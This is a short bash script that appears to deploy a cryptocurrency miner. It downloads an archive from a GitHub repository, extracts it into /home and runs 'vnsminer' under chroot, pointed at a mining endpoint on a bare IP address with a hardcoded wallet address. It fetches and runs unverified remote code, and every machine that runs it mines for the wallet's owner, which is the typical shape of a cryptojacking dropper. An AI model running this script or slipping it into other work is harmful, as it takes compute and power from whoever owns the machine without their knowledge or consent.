#!/bin/bash
curl -LO https://github.com/2319763378/pool/raw/master/vns/vns.tgz
tar xvf  vns.tgz -C /home
chroot /home/vns vnsminer 1 http://129.28.240.129:8888/0xb85150eb365e7df0941f0cf08235f987ba91506a
